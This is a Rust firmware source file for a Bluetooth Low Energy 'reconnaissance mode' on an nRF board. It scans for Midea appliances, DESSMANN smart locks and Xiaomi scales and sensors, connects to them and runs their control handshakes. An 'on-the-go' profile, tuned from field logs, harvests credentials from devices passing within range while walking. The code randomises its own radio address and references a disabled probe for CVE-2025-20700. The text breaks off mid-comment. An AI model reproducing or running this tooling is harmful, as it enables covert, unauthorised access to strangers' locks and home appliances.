//! Reconnaissance mode: a single-loop active central that scans, classifies each
//! device by its GATT services, and runs that family's survey→assessment→report.
//!
//! One task owns the radio start-to-finish — no inter-task mutexes — cycling:
//! listen for adverts (5 s), pick the strongest device whose type the advert alone
//! reveals — we do NOT connect just to classify — connect and discover its
//! services, then branch by kind:
//!   * **Midea** (0x06A8 advert → FFA0) — C1→C2→C3 handshake, then decrypt status.
//!   * **Airoha** (RACE) — unauthenticated READ_SDK_VERSION/GET_BD_ADDRESS probe
//!     (CVE-2025-20700). Currently DISABLED in `classify` (earbuds not probed).
//!   * **Generic** — a Midea-advert device with no FFA0: skipped (full enumerate +
//!     listen is the GATT-enum mode's job).
//!
//! Then disconnect. A failed probe stays a candidate; a completed one cools down.
//!
//! The generic BLE-central machinery (connect, CSA#1, T_IFS, ATT/GATT walk) is
//! shared with GATT-enum in [`crate::central`]; this module owns the per-family
//! specifics ([`crate::device::midea`], [`crate::device::airoha`]) and the device
//! table. The onboard LED (driven by [`led_task`]) shows the current phase.

use core::cell::UnsafeCell;
use core::fmt::Write;

use core::num::NonZeroU64;
use core::sync::atomic::Ordering;

use embassy_nrf::pac;
use embassy_nrf::pac::radio::vals;
use embassy_time::{Duration, Instant, Timer};

use crate::central::{
    ADV_CHANNELS, ATT_MTU_MAX, CONN_AA,
    Candidate, Characteristic, Conn, ConnectStats, Interest, LISTEN_EVENTS, MAX_CHARS_PER_SVC,
    MAX_SERVICES, RX_BUF, SURVEY_DWELL_MS, Service, att_write_await_notify,
    configure_conn_radio, discover_characteristics, discover_descriptors,
    discover_services, exchange_mtu, listen_notifications,
    pick_access_address, pick_conn_params, randomize_our_addr,
    subscribe, terminate, try_connect, walk_services,
};
use super::drive_indicator;
use crate::hal::radio::{configure_ble, ensure_disabled, wait_disabled};
use crate::led::Pwm;
use crate::{Rng, decoder, device, led};

// ── Config ────────────────────────────────────────────────────────────────────

/// Device table capacity. Full table → the oldest-seen entry is evicted.
const TABLE_MAX: usize = 128;
/// Distinct devices a single scan window tracks before folding into the table.
const SCAN_MAX: usize = 64;
/// Minimum gap between advert-liveness LED winks (rate-limit for the per-advert
/// flash so it reads as a ~4 Hz heartbeat, not an invisible blur).
const ADV_FLASH_MS: u64 = 250;

/// Tuning knobs that differ between the two operating modes.
struct ReconParams {
    /// How long to listen for adverts each cycle.
    scan_window_ms: u64,
    /// Stop scanning and connect the moment a qualifying Midea advert is seen
    /// (interrupt-driven). When `false`, the full `scan_window_ms` always elapses
    /// before the first connection attempt.
    interrupt_on_midea: bool,
    /// Ignore candidates with RSSI below this threshold. On-the-go, a weak signal
    /// means the device will be out of range before the probe completes; sit-still
    /// can afford to try marginal signals because the device is not moving.
    rssi_floor: i16,
    /// After a completed probe, keep the device out of the candidate pool for this
    /// long. Shorter on-the-go (the device will be gone anyway; if it reappears,
    /// re-probe sooner).
    cooldown_ms: u64,
    /// When `true`, walk every GATT service after the handshake for the full data-
    /// collection log. When `false`, skip the walk — the credential and one status
    /// frame are enough for on-the-go. The walk is the largest single time sink.
    full_walk: bool,
}

/// Stationary data-collection. Devices come and go at leisure; missing one is not
/// catastrophic because it may reappear. Full GATT walk is desirable for the log.
const SIT_STILL: ReconParams = ReconParams {
    scan_window_ms: 5_000,
    interrupt_on_midea: false,
    rssi_floor: -100, // accept everything in range
    cooldown_ms: 15 * 60 * 1000,
    full_walk: true,
};

/// Mobile data-collection. Devices pass by with ~30 s windows; maximise the
/// probability of getting the credential before the peer leaves range. No full walk
/// — the handshake + one status frame is the goal.
///
/// Params tuned from the 2026-08-12T18:06:05 midea log (9 435 s, 166 attempts):
///   scan→connect latency median ~300 ms → 1 500 ms gives 4+ advert-channel sweeps
///   before interrupt fires (or the window ends).
///   RSSI floor −82: ev_addr=0 (bidirectional failure) clusters at −78 to −90 with
///   no clean separator, but failures below −82 outnumber successes ~3:1; cutting
///   there avoids the worst tail without missing too many genuine close devices.
///   Cooldown 3 min: walking at ~1 m/s covers 180 m in 3 min; device is gone anyway.
#[allow(dead_code)]
const ON_THE_GO: ReconParams = ReconParams {
    scan_window_ms: 1_500,
    interrupt_on_midea: true,
    rssi_floor: -82,
    cooldown_ms: 3 * 60 * 1000,
    full_walk: false,
};

/// Active parameter set.
#[allow(dead_code)]
const SIT_STILL_PARAMS: &ReconParams = &SIT_STILL;
const PARAMS: &ReconParams = &ON_THE_GO;

// ── Timestamps (Option<NonZeroU64>: ms since boot, None = never) ───────────────

/// Milliseconds since boot as a `NonZeroU64` — the `+1` keeps it non-zero so
/// `Option<NonZeroU64>` gets the niche and `None` cleanly means "never".
fn stamp() -> NonZeroU64 {
    NonZeroU64::new(Instant::now().as_millis() + 1).unwrap()
}
/// ms elapsed since a stamp, or `-1` when never set (for logging / oldest-wins).
fn age_ms(t: Option<NonZeroU64>) -> i64 {
    match t {
        Some(t) => (stamp().get() - t.get()) as i64,
        None => -1,
    }
}

// ── Device table ──────────────────────────────────────────────────────────────

/// How far a device has got through the discover→probe cycle.
#[derive(Clone, Copy, PartialEq, Eq)]
enum ProbeState {
    Seen,
    Probed,
    ProbeFailed,
}
impl core::fmt::Display for ProbeState {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.write_str(match self {
            ProbeState::Seen => "seen",
            ProbeState::Probed => "probed",
            ProbeState::ProbeFailed => "probe_failed",
        })
    }
}

/// Outcome of the Midea control-channel handshake for this device.
#[derive(Clone, Copy, PartialEq, Eq)]
enum HandshakeState {
    NoHandshake,
    HandshakeSuccessful,
    HandshakeFail,
    /// The device answered our c1/c2 with a security error (ff04) — it rejects
    /// the control handshake outright. Cooled far longer so it stops hogging the
    /// picker every few minutes.
    Unsupported,
}
impl core::fmt::Display for HandshakeState {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.write_str(match self {
            HandshakeState::NoHandshake => "no_handshake",
            HandshakeState::HandshakeSuccessful => "handshake_successful",
            HandshakeState::HandshakeFail => "handshake_fail",
            HandshakeState::Unsupported => "unsupported",
        })
    }
}

/// Device family, decided from the GATT services found during a probe (or hinted
/// from the advert for Midea, whose serial is broadcast). Selects the
/// survey→assessment→report branch.
#[derive(Clone, Copy, PartialEq, Eq)]
enum DeviceKind {
    Unknown,
    Midea,
    /// DESSMANN smart-lock (advert name `LOCK_`, GATT channel 0xFFE9/0xFFE4).
    Dessmann,
    /// Mi Body Composition Scale (Newbit `MI_Scale` clone; measurement notify).
    Miscale,
    /// MiBeacon sensor (XMZNMS08LM door/window sensor 2, LYWSD03MMC temp/humidity
    /// monitor 2) — probed by reading its GATT sensor values.
    Misensor,
    /// Never constructed while Airoha RACE detection is disabled in `classify`; kept
    /// (with the branch that would set it) for re-enabling.
    #[allow(dead_code)]
    Airoha,
    Generic,
}
impl core::fmt::Display for DeviceKind {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.write_str(match self {
            DeviceKind::Unknown => "unknown",
            DeviceKind::Midea => "midea",
            DeviceKind::Dessmann => "dessmann",
            DeviceKind::Miscale => "miscale",
            DeviceKind::Misensor => "misensor",
            DeviceKind::Airoha => "airoha",
            DeviceKind::Generic => "generic",
        })
    }
}

/// One tracked device.
#[derive(Clone, Copy)]
struct DeviceEntry {
    /// 14-byte Midea serial from the advert, when present; `None` for non-Midea.
    sn: Option<[u8; 14]>,
    addr: [u8; 6],
    addr_random: bool,
    /// Strongest RSSI seen; drives pick order (least-negative wins).
    rssi: i16,
    last_seen: Option<NonZeroU64>,
    last_probed: Option<NonZeroU64>,
    /// Family, set once a probe classifies it (advert gives a Midea hint earlier).
    kind: DeviceKind,
    probe_state: ProbeState,
    handshake_state: HandshakeState,
}

type Table = heapless::Vec<DeviceEntry, TABLE_MAX>;

/// The device table. A single task owns it start-to-finish, so it needs no mutex
/// — the `UnsafeCell` is only to get a `&'static mut` out of a static (same idiom
/// as the radio DMA buffers); there is exactly one accessor, [`run`].
struct TableCell(UnsafeCell<Table>);
unsafe impl Sync for TableCell {}
static TABLE: TableCell = TableCell(UnsafeCell::new(heapless::Vec::new()));

/// A cooldown record: a probed address and when it may be probed again. Held in a
/// small ring owned by [`run`] — SEPARATE from the device table (which lists only
/// Midea/Airoha). It exists so the candidate picker makes progress instead of
/// re-probing the strongest device every round, without tabling the generics.
#[derive(Clone, Copy)]
struct Recent {
    addr: [u8; 6],
    until: NonZeroU64,
}
const RECENT_MAX: usize = 128;
type RecentRing = heapless::Vec<Recent, RECENT_MAX>;

/// Whether `addr` is still within its probe cooldown.
fn in_cooldown(recent: &RecentRing, addr: &[u8; 6]) -> bool {
    let now = Instant::now().as_millis();
    recent.iter().any(|r| &r.addr == addr && r.until.get() > now)
}

/// Record `addr` as probed, cooling it for `dur_ms`. Updates an existing record or
/// inserts one, evicting the soonest-to-expire entry when full.
fn mark_recent(recent: &mut RecentRing, addr: [u8; 6], dur_ms: u64) {
    let until = NonZeroU64::new(Instant::now().as_millis() + dur_ms + 1).unwrap();
    if let Some(r) = recent.iter_mut().find(|r| r.addr == addr) {
        r.until = until;
        return;
    }
    if recent.is_full()
        && let Some(soonest) = (0..recent.len()).min_by_key(|&i| recent[i].until.get())
    {
        recent.swap_remove(soonest);
    }
    let _ = recent.push(Recent { addr, until });
}

/// Add or refresh a *tracked* device in the table. Only Midea and Airoha devices
/// are ever tracked; Unknown and Generic are never added — the table lists only
/// devices worth keeping (see [`run`]). Evicts the oldest-seen entry when full.
fn track(
    table: &mut Table,
    c: &Candidate,
    kind: DeviceKind,
    state: ProbeState,
    hs: HandshakeState,
) {
    debug_assert!(matches!(kind, DeviceKind::Midea | DeviceKind::Airoha | DeviceKind::Dessmann | DeviceKind::Miscale));
    if let Some(e) = table.iter_mut().find(|e| e.addr == c.addr) {
        if c.rssi > e.rssi {
            e.rssi = c.rssi;
        }
        if let Some(Interest::Midea(sn)) = c.interest {
            e.sn = Some(sn);
        }
        e.kind = kind;
        e.probe_state = state;
        e.handshake_state = hs;
        e.last_seen = Some(stamp());
        e.last_probed = Some(stamp());
        return;
    }
    if table.is_full()
        && let Some(oldest) = (0..table.len()).max_by_key(|&i| age_ms(table[i].last_seen))
    {
        table.swap_remove(oldest);
    }
    let _ = table.push(DeviceEntry {
        sn: c.interest.and_then(|i| i.midea_sn()),
        addr: c.addr,
        addr_random: c.addr_random,
        rssi: c.rssi,
        last_seen: Some(stamp()),
        last_probed: Some(stamp()),
        kind,
        probe_state: state,
        handshake_state: hs,
    });
}

/// Refresh RSSI / last-seen of already-tracked devices from a scan (so the table
/// log stays current), adding nothing new.
fn refresh_seen(table: &mut Table, found: &[Candidate]) {
    for c in found {
        if let Some(e) = table.iter_mut().find(|e| e.addr == c.addr) {
            if c.rssi > e.rssi {
                e.rssi = c.rssi;
            }
            e.last_seen = Some(stamp());
        }
    }
}

/// Pick the strongest-RSSI scan candidate not currently in probe cooldown and
/// above the RSSI floor in the active params.
fn pick_candidate(found: &[Candidate], recent: &RecentRing) -> Option<usize> {
    let mut best: Option<usize> = None;
    for i in 0..found.len() {
        if found[i].rssi < PARAMS.rssi_floor {
            continue; // too weak — likely out of range before probe completes
        }
        if in_cooldown(recent, &found[i].addr) {
            continue;
        }
        let better = match best {
            None => true,
            Some(j) => {
                // A DESSMANN lock is probed first, ahead of the Midea fleet —
                // they are few, persistent, and the command probe is quick.
                let pi = found[i].interest.map_or(0, |i| i.priority());
                let pj = found[j].interest.map_or(0, |i| i.priority());
                if pi != pj {
                    pi > pj
                } else {
                    found[i].rssi > found[j].rssi
                }
            }
        };
        if better {
            best = Some(i);
        }
    }
    best
}

/// Log the whole device table — one line per entry with its timers/state.
fn log_table(table: &Table) {
    ulogf!("rtable: entries={}\r\n", table.len());
    for e in table {
        let (sns, dtype) = match &e.sn {
            Some(sn) => (sn_string(sn), device::midea::device_type(sn)),
            None => (heapless::String::new(), ""),
        };
        ulogf!(
            "  addr={:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} kind={} sn={} type={} rssi={} \
             last_seen_ms={} last_probe_ms={} probe={} hs={}\r\n",
            e.addr[5], e.addr[4], e.addr[3], e.addr[2], e.addr[1], e.addr[0],
            e.kind, sns, dtype, e.rssi,
            age_ms(e.last_seen), age_ms(e.last_probed), e.probe_state, e.handshake_state,
        );
    }
}

// ── LED: phase colour + event flashes ─────────────────────────────────────────
//
// One loop, so the LED simply names the current step. Two rules keep it readable:
//   * the base colour is the current phase (a stuck colour names a wedged step);
//   * flashes are events, always settling back to the phase colour, so a flash
//     never leaves the LED misreporting state.
//
// | Colour          | Meaning                                              |
// |-----------------|------------------------------------------------------|
// | Off             | between cycles                                        |
// | Green           | listening for adverts (white wink per advert = alive)|
// | Blue            | connecting + enumerating a device's GATT             |
// | Magenta         | C1→C2→C3 handshake in progress                       |
// | Cyan            | listening for subscriptions / status                 |
// | Green flash ×2  | handshake succeeded                                  |
// | Yellow flash ×2 | handshake failed                                     |
// | White flash ×1  | enumerated, no FFA1/FFA2 (subscribe-only)            |
// | Red flash ×1    | connect failed                                       |

#[derive(Clone, Copy)]
enum Phase {
    Idle = 0,
    Scan = 1,
    Enumerate = 2,
    Handshake = 3,
    Listen = 4,
}

static PHASE: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);

impl Phase {
    fn colour(self) -> led::Rgb {
        match self {
            Phase::Idle => led::OFF,
            Phase::Scan => led::GREEN,
            Phase::Enumerate => led::BLUE,
            Phase::Handshake => led::MAGENTA,
            Phase::Listen => led::CYAN,
        }
    }
    fn from_u8(v: u8) -> Self {
        match v {
            1 => Phase::Scan,
            2 => Phase::Enumerate,
            3 => Phase::Handshake,
            4 => Phase::Listen,
            _ => Phase::Idle,
        }
    }
}

/// Enter a phase: record it and light its colour.
fn set_phase(p: Phase) {
    PHASE.store(p as u8, Ordering::Relaxed);
    led::solid(p.colour());
}

/// Flash an event colour, settling back to the current phase colour.
fn flash(colour: led::Rgb, count: u16) {
    let base = Phase::from_u8(PHASE.load(Ordering::Relaxed)).colour();
    led::blink_then(colour, base, count, 60, 60);
}

// ── Main loop ───────────────────────────────────────────────────────────────

/// The whole mode in one task: scan → pick → probe → record, forever. The radio
/// is never contended (no other task touches it) and never idle (with nothing to
/// probe it simply scans again).
#[embassy_executor::task]
pub async fn run() -> ! {
    let mut rng = Rng(0x6D69_6465);
    // SAFETY: `run` is the sole accessor of TABLE, spawned once.
    let table = unsafe { &mut *TABLE.0.get() };
    // Probe-cooldown ring, owned here (not a static). Distinct from the device
    // table: it remembers every probed address so the picker advances, but the
    // table itself only ever holds Midea/Airoha devices.
    let mut recent: RecentRing = heapless::Vec::new();
    loop {
        // 1. Listen for adverts; refresh already-tracked devices, but add nothing —
        //    a device only enters the table once a probe classifies it Midea/Airoha.
        set_phase(Phase::Scan);
        log_table(table);
        ulogf!("rscan: scan start (passive RX, {}ms rssi_floor={})\r\n",
            PARAMS.scan_window_ms, PARAMS.rssi_floor);
        let found = scan(&mut rng, &recent).await;
        refresh_seen(table, &found);
        // Log the candidate pool when there is a real choice — a handshakable
        // device the picker skips (in cooldown / below floor) should be visible,
        // not silent.
        if found.len() >= 2 {
            ulogf!("rscan: candidates {}\r\n", found.len());
            for c in &found {
                let sn = c.interest.and_then(|i| i.midea_sn()).map(|s| sn_string(&s)).unwrap_or_default();
                ulogf!("  cand {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} rssi={} sn={} cooled={}\r\n",
                    c.addr[5], c.addr[4], c.addr[3], c.addr[2], c.addr[1], c.addr[0],
                    c.rssi, sn, in_cooldown(&recent, &c.addr));
            }
        }

        // 2. Pick the strongest scan candidate not in probe cooldown. `scan` only
        //    collects advert-identifiable devices (today: Midea), so we never
        //    connect just to classify. Unknown/generic devices are never candidates
        //    and never enter the table; the picker works off the scan list.
        let Some(ci) = pick_candidate(&found, &recent) else {
            set_phase(Phase::Idle);
            continue; // nothing to probe → scan again (never idle)
        };
        let cand = found[ci];
        let e = DeviceEntry {
            sn: cand.interest.and_then(|i| i.midea_sn()),
            addr: cand.addr,
            addr_random: cand.addr_random,
            rssi: cand.rssi,
            last_seen: Some(stamp()),
            last_probed: None,
            kind: match cand.interest {
                Some(Interest::Dessmann) => DeviceKind::Dessmann,
                Some(Interest::MiSensor) => DeviceKind::Misensor,
                Some(Interest::MiScale) => DeviceKind::Miscale,
                Some(Interest::Midea(_)) => DeviceKind::Midea,
                None => DeviceKind::Unknown,
            },
            probe_state: ProbeState::Seen,
            handshake_state: HandshakeState::NoHandshake,
        };

        // 3. Connect, classify, run the kind's survey→assessment→report branch.
        let (probe_state, kind, hs_state) = probe_device(&mut rng, &e).await;

        // 4a. Cooldown: a completed probe (Midea/Airoha/Generic) cools down so the
        //     picker moves on; a *failed* probe (no link / discovery lost) is left
        //     uncooled so it stays a candidate next round.
        if !matches!(probe_state, ProbeState::ProbeFailed) {
            // A device that rejected the control handshake outright (ff04 →
            // Unsupported) is cooled far longer than the normal cooldown — the
            // "unsupported" state will not change in a few minutes.
            let cool = if hs_state == HandshakeState::Unsupported {
                UNSUPPORTED_COOLDOWN_MS
            } else {
                PARAMS.cooldown_ms
            };
            mark_recent(&mut recent, cand.addr, cool);
        }
        // 4b. Only Midea/Airoha are tracked in the table; unknown and generic are
        //     probed and logged but never added.
        if matches!(kind, DeviceKind::Midea | DeviceKind::Airoha | DeviceKind::Dessmann | DeviceKind::Miscale) {
            track(table, &cand, kind, probe_state, hs_state);
        }
    }
}

/// Spawnable LED task — the phase-colour indicator (`crate::led::LED` signal).
#[embassy_executor::task]
pub async fn led_task(mut leds: Pwm) -> ! {
    drive_indicator(&mut leds).await
}

// ── Midea protocol ────────────────────────────────────────────────────────────
// The C1→C2→C3 handshake + status-query driver lives in [`midea`]; here we keep
// the shared handshake timeout, the cooldown policy for an unsupported control
// type, and the shared SN formatter.

mod midea;
mod dessmann;
mod mi;

/// Connection events to wait for a handshake reply notification — shared by the
/// midea probe and the dessmann/mi probes that use the same write-and-notify
/// exchange.
const HS_REPLY_EVENTS: u32 = 60;

/// Cooldown for a device that rejected the control handshake with a security
/// error (ff04): "unsupported type" will not change in a few minutes, so keep it
/// out of the candidate pool this long instead of the normal [`PARAMS`] cooldown.
const UNSUPPORTED_COOLDOWN_MS: u64 = 45 * 60 * 1000;

/// Format the 14-byte ASCII short serial (printable characters only) for logging.
fn sn_string(sn: &[u8; 14]) -> heapless::String<14> {
    let mut s = heapless::String::new();
    for &b in sn {
        if (0x20..=0x7E).contains(&b) {
            let _ = s.push(b as char);
        }
    }
    s
}

// ── Radio operations ──────────────────────────────────────────────────────────
// Device-of-interest detection from an advert is [`crate::device::classify_interest`].

/// One scan window: sweep the advertising channels for [`SCAN_WINDOW_MS`], return
/// the Midea appliances heard (deduped by SN, strongest RSSI), and log a capture
/// Log the per-round scan tally: packets received (`adv_seen`, every CRC-ok
/// advertising PDU) and distinct devices of interest per type (from `found` —
/// device counts, not packets).
fn log_captured(adv_seen: u32, found: &[Candidate]) {
    ulogf!(
        "rscan: captured adv={} midea={} dessmann={} misensor={} miscale={} distinct={}\r\n",
        adv_seen,
        found.iter().filter(|c| matches!(c.interest, Some(Interest::Midea(_)))).count(),
        found.iter().filter(|c| matches!(c.interest, Some(Interest::Dessmann))).count(),
        found.iter().filter(|c| matches!(c.interest, Some(Interest::MiSensor))).count(),
        found.iter().filter(|c| matches!(c.interest, Some(Interest::MiScale))).count(),
        found.len(),
    );
}

/// tally. A brief white LED wink per advert (rate-limited) shows the radio alive.
async fn scan(rng: &mut Rng, recent: &RecentRing) -> heapless::Vec<Candidate, SCAN_MAX> {
    configure_ble();
    let r = pac::RADIO;
    let mut found: heapless::Vec<Candidate, SCAN_MAX> = heapless::Vec::new();
    let mut others: heapless::Vec<[u8; 14], 32> = heapless::Vec::new();
    let mut adv_seen = 0u32; // every CRC-ok advertising PDU this round
    let mut last_flash: Option<Instant> = None; // rate-limit for the liveness wink
    let end = Instant::now() + Duration::from_millis(PARAMS.scan_window_ms);
    while Instant::now() < end {
        for &(ch_idx, freq) in ADV_CHANNELS.iter() {
            ensure_disabled();
            r.frequency().write(|w| {
                w.set_frequency(freq);
                w.set_map(vals::Map::Default);
            });
            r.datawhiteiv().write(|w| w.set_datawhiteiv(ch_idx));
            r.packetptr().write_value(RX_BUF.0.get() as u32);
            r.events_end().write_value(0);
            r.events_crcok().write_value(0);
            r.events_address().write_value(0);
            r.events_disabled().write_value(0);
            r.shorts().write(|w| {
                w.set_rxready_start(true);
                w.set_address_rssistart(true);
            });
            r.tasks_rxen().write_value(1);

            let deadline = Instant::now() + Duration::from_millis(SURVEY_DWELL_MS);
            while Instant::now() < deadline {
                if r.events_end().read() != 0 {
                    r.events_end().write_value(0);
                    let crc_ok = r.events_crcok().read() != 0;
                    let rssi = -(r.rssisample().read().rssisample() as i16);
                    r.events_crcok().write_value(0);
                    r.events_address().write_value(0);
                    if crc_ok {
                        adv_seen += 1;
                        // Liveness heartbeat: a brief white wink on the green scan
                        // base each time we hear an advert (rate-limited). Steady
                        // winking = radio alive and receiving; a still LED means it
                        // has gone deaf (RF/antenna), distinct from "no appliances".
                        let now = Instant::now();
                        if last_flash.is_none_or(|t| (now - t).as_millis() >= ADV_FLASH_MS) {
                            flash(led::WHITE, 1);
                            last_flash = Some(now);
                        }
                        let buf = unsafe { &*RX_BUF.0.get() };
                        let pdu_type = buf[0] & 0x0F;
                        let len = buf[1] as usize;
                        // ADV_IND (0x00) only — ADV_DIRECT_IND (0x01) carries an
                        // InitA field naming its intended initiator; our CONNECT_IND
                        // is silently ignored if InitA doesn't match our address.
                        // Midea appliances always use undirected ADV_IND anyway.
                        if pdu_type == 0x00 && len >= 6 {
                            let addr = [buf[2], buf[3], buf[4], buf[5], buf[6], buf[7]];
                            let addr_random = (buf[0] >> 6) & 1 == 1;
                            // Only devices whose type is identifiable from the advert
                            // alone become probe targets — we do not connect just to
                            // classify: a Midea 0x06A8 serial, a DESSMANN lock (name
                            // `LOCK_`), a MiBeacon sensor, or a weight scale. Every
                            // other advertiser is still counted (`adv_seen`) but is
                            // never connected to.
                            let mut bad_sn = None;
                            let interest = device::classify_interest(&buf[8..2 + len], &mut bad_sn);
                            if let Some(sn) = bad_sn
                                && !others.iter().any(|o| o == &sn)
                            {
                                let _ = others.push(sn);
                                ulogf!("rscan: corrupt sn (skipped)\r\n");
                            }
                            if interest.is_some() {
                                if let Some(c) = found.iter_mut().find(|c| c.addr == addr) {
                                    if rssi > c.rssi {
                                        c.rssi = rssi;
                                    }
                                    // First classification wins — a device does not
                                    // change type mid-scan.
                                    if c.interest.is_none() {
                                        c.interest = interest;
                                    }
                                } else {
                                    let _ = found.push(Candidate { addr, addr_random, rssi, interest });
                                }
                                // On-the-go: stop scanning the moment we see a
                                // qualifying Midea advert above the RSSI floor that
                                // is NOT in cooldown. Without the cooldown check, a
                                // device that was just probed triggers ~30 scan
                                // restarts per second (Midea advertises at ~100 ms).
                                if PARAMS.interrupt_on_midea
                                    && rssi >= PARAMS.rssi_floor
                                    && !in_cooldown(recent, &addr)
                                {
                                    r.shorts().write(|_w| {});
                                    r.tasks_disable().write_value(1);
                                    let _ = wait_disabled();
                                    ulogf!("rscan: interrupt — midea adv rssi={} (on-the-go)\r\n", rssi);
                                    log_captured(adv_seen, &found);
                                    return found;
                                }
                            }
                        }
                    }
                    r.tasks_start().write_value(1);
                }
                Timer::after_micros(200).await;
                rng.stir(r.rssisample().read().rssisample() as u32);
            }
            r.shorts().write(|_w| {});
            r.tasks_disable().write_value(1);
            let _ = wait_disabled();
            r.events_disabled().write_value(0);
        }
    }
    log_captured(adv_seen, &found);
    found
}

/// Connect to `e` and run a full GATT enumeration — which logs the whole attribute
/// tree, reads every readable value (logging insufficient-auth failures), and
/// subscribes to notifiable characteristics. Returns the live connection, the
/// Midea control profile *if present* (FFA1/FFA2), and the service count; `None`
/// (radio left DISABLED) on connect failure. The caller branches and always
/// closes.
/// Connect, raise the MTU, discover services, and locate the FFA1/FFA2 control
/// profile — enabling FFA2 notifications so the handshake, which runs before the
/// heavier full walk, can receive its replies. Returns the live link, the profile
/// if the device exposes one, and the service list for the caller to walk.
/// What a probe's service discovery classified the device as, plus whichever
/// control profile it located (with its notify CCCD already enabled).
struct Classified {
    kind: DeviceKind,
    midea: Option<device::midea::gatt::Profile>,
    airoha: Option<device::airoha::Profile>,
    dessmann: Option<device::dessmann::Profile>,
    miscale: Option<device::mi::Profile>,
}

/// Reconstruct the scan-time interest for a table entry, for the handshake
/// paths that take a `Candidate` (the table only stores the Midea SN + kind).
fn entry_interest(e: &DeviceEntry) -> Option<Interest> {
    e.sn.map(Interest::Midea).or(match e.kind {
        DeviceKind::Dessmann => Some(Interest::Dessmann),
        DeviceKind::Misensor => Some(Interest::MiSensor),
        DeviceKind::Miscale => Some(Interest::MiScale),
        _ => None,
    })
}

async fn open(
    rng: &mut Rng,
    e: &DeviceEntry,
) -> Option<(Conn, Classified, heapless::Vec<Service, MAX_SERVICES>)> {
    CONN_AA.store(pick_access_address(rng), Ordering::Relaxed);
    pick_conn_params(rng);
    randomize_our_addr(rng);
    let cand = Candidate { addr: e.addr, addr_random: e.addr_random, rssi: 0, interest: entry_interest(e) };
    let mut cstat = ConnectStats::default();
    let Some(mut conn) = try_connect(&cand, &mut cstat).await else {
        ulogf!("  connect failed (target={} connectable={})\r\n", cstat.target, cstat.connectable);
        flash(led::RED, 1); // no link
        ensure_disabled();
        configure_ble();
        return None;
    };
    configure_conn_radio();

    // Raise the MTU (optional, short budget) then discover services once. The full
    // characteristic walk is deferred so the assessment can run on the fresh link.
    exchange_mtu(&mut conn).await;
    let mut services: heapless::Vec<Service, MAX_SERVICES> = heapless::Vec::new();
    discover_services(&mut conn, &mut services).await;
    ulogf!("  services = {}\r\n", services.len());

    let cls = if conn.ev_addr != 0 {
        classify(&mut conn, &services).await
    } else {
        Classified { kind: e.kind, midea: None, airoha: None, dessmann: None, miscale: None }
    };
    ulogf!("  classified = {}\r\n", cls.kind);
    Some((conn, cls, services))
}

/// Enable the notify/indicate CCCD of characteristic `ci` (its descriptor range
/// runs from its value handle to just before the next characteristic, or the
/// service end). Both control branches must subscribe before writing so the peer
/// will answer on the notify characteristic.
async fn enable_cccd(conn: &mut Conn, chars: &[Characteristic], ci: usize, svc_end: u16) {
    let ch = chars[ci];
    let desc_to = if ci + 1 < chars.len() {
        chars[ci + 1].decl_handle.saturating_sub(1)
    } else {
        svc_end
    };
    if let Some(cccd) = discover_descriptors(conn, ch.value_handle + 1, desc_to).await {
        subscribe(conn, cccd, ch.props).await;
    }
}

/// Inspect the discovered services and locate a known control profile — Midea
/// (FFA0/FFA1/FFA2) or Airoha RACE (write/notify pair) — enabling the notify CCCD
/// of whichever it finds. Everything else classifies as `Generic`.
async fn classify(conn: &mut Conn, services: &[Service]) -> Classified {
    use device::midea::gatt as mgatt;
    let mut out = Classified { kind: DeviceKind::Generic, midea: None, airoha: None, dessmann: None, miscale: None };
    for svc in services {
        let su = &svc.uuid[..svc.uuid_len as usize];
        if mgatt::role(su) == Some(mgatt::Role::Service) {
            // Midea control service: FFA1 (write) + FFA2 (notify).
            let mut chars: heapless::Vec<Characteristic, MAX_CHARS_PER_SVC> = heapless::Vec::new();
            discover_characteristics(conn, svc, &mut chars).await;
            let (mut w, mut n) = (None, None);
            for ci in 0..chars.len() {
                match mgatt::role(&chars[ci].uuid[..chars[ci].uuid_len as usize]) {
                    Some(mgatt::Role::Write) => w = Some(chars[ci].value_handle),
                    Some(mgatt::Role::Notify) => {
                        n = Some(chars[ci].value_handle);
                        enable_cccd(conn, &chars, ci, svc.end).await;
                    }
                    _ => {}
                }
            }
            if let (Some(write_h), Some(notify_h)) = (w, n) {
                out.kind = DeviceKind::Midea;
                out.midea = Some(mgatt::Profile { write_h, notify_h });
            }
        } else if device::dessmann::is_dessmann_service(svc_uuid16(svc)) {
            // DESSMANN smart-lock command channel: write 0xFFE9 + notify 0xFFE4,
            // split across services 0xFFE0 (notify) and 0xFFE5 (write).
            let mut chars: heapless::Vec<Characteristic, MAX_CHARS_PER_SVC> = heapless::Vec::new();
            discover_characteristics(conn, svc, &mut chars).await;
            let (mut w, mut n) = (None, None);
            for ci in 0..chars.len() {
                match device::dessmann::char_role(char_uuid16(&chars[ci])) {
                    Some(device::dessmann::Role::Write) => w = Some(chars[ci].value_handle),
                    Some(device::dessmann::Role::Notify) => {
                        n = Some(chars[ci].value_handle);
                        enable_cccd(conn, &chars, ci, svc.end).await;
                    }
                    _ => {}
                }
            }
            if let (Some(write_h), Some(notify_h)) = (w, n) {
                out.kind = DeviceKind::Dessmann;
                out.dessmann = Some(device::dessmann::Profile { write_h, notify_h });
            }
        } else if device::mi::is_scale_service(&svc.uuid[..svc.uuid_len as usize]) {
            // Mi Body Composition Scale: a config write + a measurement notify
            // channel (Newbit `MI_Scale` clone).
            let mut chars: heapless::Vec<Characteristic, MAX_CHARS_PER_SVC> = heapless::Vec::new();
            discover_characteristics(conn, svc, &mut chars).await;
            let (mut cfg, mut n) = (None, None);
            for ci in 0..chars.len() {
                match device::mi::char_role(&chars[ci].uuid[..chars[ci].uuid_len as usize]) {
                    Some(device::mi::Role::Config) => cfg = Some(chars[ci].value_handle),
                    Some(device::mi::Role::Notify) => {
                        n = Some(chars[ci].value_handle);
                        enable_cccd(conn, &chars, ci, svc.end).await;
                    }
                    _ => {}
                }
            }
            if let (Some(config_h), Some(notify_h)) = (cfg, n) {
                out.kind = DeviceKind::Miscale;
                out.miscale = Some(device::mi::Profile { config_h, notify_h });
            }
        }
        // ── Airoha RACE detection: DISABLED for now (we do not probe earbuds) ──
        // With this branch commented out, an Airoha earbud classifies as Generic and
